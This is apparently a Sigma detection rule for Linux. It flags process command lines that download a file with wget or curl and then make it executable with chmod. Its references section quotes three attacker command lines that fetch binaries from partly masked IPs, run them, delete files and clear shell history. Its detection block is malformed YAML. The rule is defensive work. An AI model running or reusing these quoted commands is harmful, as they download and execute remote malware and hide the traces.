title: suspicious Download and Execution
id: 0250ed4e-ccdb-4c65-9910-64b03b81606b
status: experimental
description: Looking for commands run that trying to download via both wget & curl, chmodding the file ready to execute
references:
    - cd /tmp || cd /var/ || cd /var/run || cd /mnt || cd /root || cd /; rm -rf i; wget http://27.41.17.xx:51909/i; curl -O http://27.41.17.xx:51909/i; /bin/busybox wget http://27.41.17.xx:51909/i; chmod 777 i || (cp /bin/ls ii;cat i>ii;rm i;cp ii i;rm ii); ./i; echo -e '\x63\x6F\x6E\x6E\x65\x63\x74\x65\x64' 1
    - #!/bin/sh; PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; wget http://23.235.171.xxx:1211/112; curl -O http://23.235.171.xxx:1211/112; chmod +x 112; ./112; rm -rf 123.sh; history -c;  4
    - wget http://194.180.49.xxx/pedalcheta/cutie.x86_64; curl -O http://194.180.49.xxx/pedalcheta/cutie.x86_64; chmod 777 cutie.*; ./cutie.x86_64 x86h; rm -rf cutie.* 1
tags:
    - attack.execution
    - attack.T1059.004
author: exeron
date: 2023/01/25 
logsource:                      
    category: process_creation  
    product: linux            
detection:
    download:
        CommandLine|contains: 'wget'
        - 'curl'
    permissions:
        CommandLine|contains: 'chmod 777'
        - 'chmod +x'
    condition: all of download and 1 of permissions*
fields:
    - process commandline
falsepositives:
    - FP level is unknown, likely interesting with defeat by exception as it will likely only show entries that are related to download and execute where the system isn't fully known
level: medium